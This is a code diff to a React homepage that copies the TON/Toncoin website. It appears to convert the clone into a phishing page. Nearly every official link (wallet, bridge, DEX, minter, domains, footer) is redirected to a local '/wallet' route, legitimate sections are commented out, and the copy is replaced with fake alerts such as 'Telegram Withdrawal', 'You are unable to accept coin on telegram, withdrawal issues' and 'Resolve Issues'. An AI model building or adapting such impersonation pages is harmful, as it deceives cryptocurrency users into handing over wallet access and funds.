@@ -5354,7 +5354,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large Wallets__button Desktop"
-                            href="https://t.me/wallet"
+                            href="/wallet"
                             target="_blank"
                             rel="noreferrer noopener"
                           >
@@ -5392,7 +5392,7 @@ function Home() {
                   </div>
 
                   <div className="styles_row__KbeM8">
-                    <a className="AppCard Wallets__row__item" href="/en">
+                    <a className="AppCard Wallets__row__item" href="/">
                       <div
                         className="AppCard__baseBackground"
                         style={{ background: "#07ACFF" }}
@@ -5427,7 +5427,7 @@ function Home() {
                     </a>
                     <a
                       className="AppCard Wallets__row__item Wallets__row__item__reversed Wallets__row__item__bordered"
-                      href="/en"
+                      href="/"
                     >
                       <div
                         className="AppCard__baseBackground"
@@ -5460,7 +5460,7 @@ function Home() {
                         className="AppCard__image fade in"
                       />
                     </a>
-                    <a className="AppCard Wallets__row__item" href="/en">
+                    <a className="AppCard Wallets__row__item" href="/wallet">
                       <div
                         className="AppCard__baseBackground"
                         style={{ background: "#1E2337" }}
@@ -5495,7 +5495,7 @@ function Home() {
                     </a>
                     <a
                       className="AppCard Wallets__row__item Wallets__row__item__reversed Wallets__row__item__bordered"
-                      href="/en"
+                      href="/wallet"
                     >
                       <div
                         className="AppCard__baseBackground"
@@ -5536,7 +5536,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large Wallets__button Mobile"
-                    href="https://t.me/wallet"
+                    href="/wallet"
                     target="_blank"
                     rel="noreferrer noopener"
                     style={{ width: "fit-content" }}
@@ -5632,7 +5632,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large ToncoinInfo__button"
-                              href="/en/buy-toncoin"
+                              href="/wallet"
                             >
                               <span className="NewButton__inner">
                                 <span
@@ -5850,7 +5850,7 @@ function Home() {
   Headline--color-primary
   "
                                     >
-                                      Nominator pools
+                                      Reflect Issues
                                     </div>
                                     <div
                                       className="Text 
@@ -5861,8 +5861,8 @@ function Home() {
   "
                                     >
                                       <p>
-                                        Use Toncoin for contribution
-                                        to&nbsp;network security.
+                                        Notcoin or Toncoin Reflect
+                                        issues&nbsp;in wallets.
                                       </p>
                                     </div>
                                   </div>
@@ -5874,7 +5874,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large"
-                                      href="/en/stake"
+                                      href="/wallet"
                                     >
                                       <span className="NewButton__inner">
                                         <span
@@ -5882,7 +5882,7 @@ function Home() {
               ButtonText--l-1
               ButtonText--t-default"
                                         >
-                                          Explore options
+                                          Explore solutions
                                         </span>
                                         <span className="NewButton__after NewButton__after--arrow">
                                           <svg
@@ -5936,7 +5936,7 @@ function Home() {
 
                             <a
                               className="card__linkWrapper"
-                              href="https://ton.app/dex"
+                              href="/wallet"
                             />
                             <div className="content SmallCard__content">
                               <div className="SmallCard__topContent SmallCard__topContent--icon">
@@ -6121,7 +6121,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large"
-                                      href="https://ton.app/dex"
+                                      href="/wallet"
                                       target="_blank"
                                       rel="noreferrer noopener"
                                     >
@@ -6185,7 +6185,7 @@ function Home() {
 
                             <a
                               className="card__linkWrapper"
-                              href="https://bridge.ton.org"
+                              href="/wallet"
                             />
                             <div className="content SmallCard__content">
                               <div className="SmallCard__topContent SmallCard__topContent--icon">
@@ -6352,7 +6352,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large"
-                                      href="https://bridge.ton.org"
+                                      href="/wallet"
                                       target="_blank"
                                       rel="noreferrer noopener"
                                     >
@@ -6362,7 +6362,7 @@ function Home() {
               ButtonText--l-1
               ButtonText--t-default"
                                         >
-                                          Go to bridge
+                                          Connect Bridge
                                         </span>
                                         <span className="NewButton__after NewButton__after--arrow">
                                           <svg
@@ -6416,7 +6416,7 @@ function Home() {
 
                             <a
                               className="card__linkWrapper"
-                              href="/en/payments"
+                              href="/wallet"
                             />
                             <div className="content SmallCard__content">
                               <div className="SmallCard__topContent SmallCard__topContent--icon">
@@ -6521,7 +6521,7 @@ function Home() {
   Headline--color-primary
   "
                                     >
-                                      Accept payments effortlessly
+                                      Telegram Withdrawal
                                     </div>
                                     <div
                                       className="Text 
@@ -6532,8 +6532,8 @@ function Home() {
   "
                                     >
                                       <p>
-                                        You are able to accept Toncoin
-                                        worldwide, directly and at low fees.
+                                        You are unable to accept coin on
+                                        telegram, withdrawal issues.
                                       </p>
                                     </div>
                                   </div>
@@ -6545,7 +6545,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large"
-                                      href="/en/payments"
+                                      href="/wallet"
                                     >
                                       <span className="NewButton__inner">
                                         <span
@@ -6553,7 +6553,7 @@ function Home() {
               ButtonText--l-1
               ButtonText--t-default"
                                         >
-                                          Accept payments
+                                          Resolve Issues
                                         </span>
                                         <span className="NewButton__after NewButton__after--arrow">
                                           <svg
@@ -6607,7 +6607,7 @@ function Home() {
 
                             <a
                               className="card__linkWrapper"
-                              href="https://minter.ton.org/"
+                              href="/wallet"
                             />
                             <div className="content SmallCard__content">
                               <div className="SmallCard__topContent SmallCard__topContent--icon">
@@ -6902,7 +6902,7 @@ function Home() {
       NewButton--background-page 
       NewButton--scheme-light
       NewButton--padding-large"
-                                      href="https://minter.ton.org/"
+                                      href="/wallet"
                                       target="_blank"
                                       rel="noreferrer noopener"
                                     >
@@ -6912,7 +6912,7 @@ function Home() {
               ButtonText--l-1
               ButtonText--t-default"
                                         >
-                                          Learn more
+                                          Start Here
                                         </span>
                                         <span className="NewButton__after NewButton__after--arrow">
                                           <svg
@@ -6966,7 +6966,7 @@ function Home() {
 
                             <a
                               className="card__linkWrapper"
-                              href="/en/borderless"
+                              href="/wallet"
                             />
                             <div className="content SmallCard__content">
                               <div className="SmallCard__topContent SmallCard__topContent--icon">
@@ -7137,7 +7137,7 @@ function Home() {
                   </div>
                 </div>
 
-                <div
+                {/* <div
                   className="NewPageBlock 
                 NewPageBlock--light 
                 size--large"
@@ -7851,9 +7851,9 @@ function Home() {
                       </div>
                     </div>
                   </div>
-                </div>
+                </div> */}
 
-                <div
+                {/* <div
                   className="NewPageBlock 
                 NewPageBlock--light 
                 size--large"
@@ -7864,9 +7864,9 @@ function Home() {
                   >
                     <div className="NewContainer__inner"></div>
                   </div>
-                </div>
+                </div> */}
 
-                <div
+                {/* <div
                   className="InternetFuture NewPageBlock 
                 NewPageBlock--overlay 
                 size--large"
@@ -8241,7 +8241,7 @@ function Home() {
                       </div>
                     </div>
                   </div>
-                </div>
+                </div> */}
 
                 <div
                   className="NewPageBlock 
@@ -8300,22 +8300,22 @@ function Home() {
                     Use
                   </div>
                   <div className="NewFooter__colLinks">
-                    <a className="NewFooter__colLink" href="/en/wallets">
+                    <a className="NewFooter__colLink" href="/wallet">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Get a wallet
                       </div>
                     </a>
-                    <a className="NewFooter__colLink" href="/en/buy-toncoin">
+                    <a className="NewFooter__colLink" href="/">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Get Toncoin
                       </div>
                     </a>
-                    <a className="NewFooter__colLink" href="/en/stake">
+                    <a className="NewFooter__colLink" href="/wallet">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Stake
                       </div>
                     </a>
-                    <a className="NewFooter__colLink" href="/en/payments">
+                    <a className="NewFooter__colLink" href="/wallet">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Accept payments
                       </div>
@@ -8324,7 +8324,7 @@ function Home() {
                       className="NewFooter__colLink"
                       target="_blank"
                       rel="noreferrer noopener"
-                      href="https://t.me/tapps_bot/center?startApp=section_web3-tonorgtma"
+                      href="/wallet"
                     >
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Apps &amp; Services
@@ -8334,7 +8334,7 @@ function Home() {
                       className="NewFooter__colLink"
                       target="_blank"
                       rel="noreferrer noopener"
-                      href="https://bridge.ton.org/"
+                      href="/wallet"
                     >
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Bridge
@@ -8344,18 +8344,18 @@ function Home() {
                       className="NewFooter__colLink"
                       target="_blank"
                       rel="noreferrer noopener"
-                      href="https://dns.ton.org/"
+                      href="/wallet"
                     >
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Domains
                       </div>
                     </a>
-                    <a className="NewFooter__colLink" href="/en/open-league">
+                    <a className="NewFooter__colLink" href="/">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         The Open League
                       </div>
                     </a>
-                    <a className="NewFooter__colLink" href="/en/borderless">
+                    <a className="NewFooter__colLink" href="/">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         USDT on TON
                       </div>
@@ -8372,7 +8372,7 @@ function Home() {
                     Community
                   </div>
                   <div className="NewFooter__colLinks">
-                    <a className="NewFooter__colLink" href="/en/community">
+                    <a className="NewFooter__colLink" href="/">
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         Communities
                       </div>
@@ -8381,7 +8381,7 @@ function Home() {
                       className="NewFooter__colLink"
                       target="_blank"
                       rel="noreferrer noopener"
-                      href="https://society.ton.org/"
+                      href="/"
                     >
                       <div className="Caption Caption--weight-regular Caption--scheme-light Caption--color-tertiary">
                         TON Society
